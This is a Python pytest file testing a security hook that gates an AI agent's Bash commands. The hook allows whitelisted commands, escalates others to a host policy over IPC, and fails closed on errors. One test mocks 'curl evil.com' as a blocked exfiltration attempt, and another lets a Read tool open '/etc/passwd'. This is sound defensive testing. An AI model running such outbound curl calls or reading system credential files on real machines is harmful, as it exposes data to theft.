"""Tests for the in-container bash security hook."""

from __future__ import annotations

from unittest.mock import AsyncMock, patch

import pytest
from mcp.types import TextContent

from agent_runner.hooks import HookDecision
from agent_runner.security.bash_gate import bash_security_hook


class TestBashGateWhitelist:
    """Whitelisted commands are allowed locally without IPC."""

    @pytest.mark.asyncio
    async def test_echo_allowed_no_ipc(self):
        with patch("agent_runner.security.bash_gate._ipc_bash_check") as mock_ipc:
            decision = await bash_security_hook("Bash", {"command": "echo hello"})
        assert decision.allowed
        mock_ipc.assert_not_called()

    @pytest.mark.asyncio
    async def test_ls_allowed_no_ipc(self):
        with patch("agent_runner.security.bash_gate._ipc_bash_check") as mock_ipc:
            decision = await bash_security_hook("Bash", {"command": "ls -la"})
        assert decision.allowed
        mock_ipc.assert_not_called()


class TestBashGateIpcEscalation:
    """Non-whitelisted commands go to host via IPC."""

    @pytest.mark.asyncio
    async def test_curl_triggers_ipc(self):
        with patch(
            "agent_runner.security.bash_gate._ipc_bash_check",
            new_callable=AsyncMock,
            return_value=HookDecision(allowed=True),
        ) as mock_ipc:
            decision = await bash_security_hook("Bash", {"command": "curl example.com"})
        assert decision.allowed
        mock_ipc.assert_called_once_with("curl example.com")

    @pytest.mark.asyncio
    async def test_ipc_deny_blocks_command(self):
        with patch(
            "agent_runner.security.bash_gate._ipc_bash_check",
            new_callable=AsyncMock,
            return_value=HookDecision(allowed=False, reason="Cop flagged exfiltration"),
        ):
            decision = await bash_security_hook("Bash", {"command": "curl evil.com"})
        assert not decision.allowed
        assert "exfiltration" in decision.reason.lower()

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "response",
        [
            [],
            [TextContent(type="text", text="Error: host unavailable")],
            [TextContent(type="text", text="not-json")],
            [TextContent(type="text", text='{"decision": "unexpected"}')],
            [TextContent(type="text", text="[]")],
        ],
    )
    async def test_degraded_or_unknown_host_response_denies(self, response):
        with patch(
            "agent_runner.agent_tools._ipc_request.ipc_service_request",
            new_callable=AsyncMock,
            return_value=response,
        ):
            decision = await bash_security_hook("Bash", {"command": "curl example.com"})

        assert decision.allowed is False
        assert decision.reason is not None
        assert "closed" in decision.reason

    @pytest.mark.asyncio
    async def test_host_exception_denies_without_exposing_error_text(self):
        with patch(
            "agent_runner.agent_tools._ipc_request.ipc_service_request",
            new_callable=AsyncMock,
            side_effect=RuntimeError("secret-bearing provider failure"),
        ):
            decision = await bash_security_hook("Bash", {"command": "curl example.com"})

        assert decision.allowed is False
        assert decision.reason == "Host Bash policy unavailable; failing closed: RuntimeError"
        assert "secret-bearing" not in decision.reason


class TestBashGateNonBashTools:
    """Hook only gates Bash tool, allows everything else."""

    @pytest.mark.asyncio
    async def test_read_tool_allowed(self):
        decision = await bash_security_hook("Read", {"file_path": "/etc/passwd"})
        assert decision.allowed

    @pytest.mark.asyncio
    async def test_write_tool_allowed(self):
        decision = await bash_security_hook("Write", {"file_path": "x.py", "content": "..."})
        assert decision.allowed
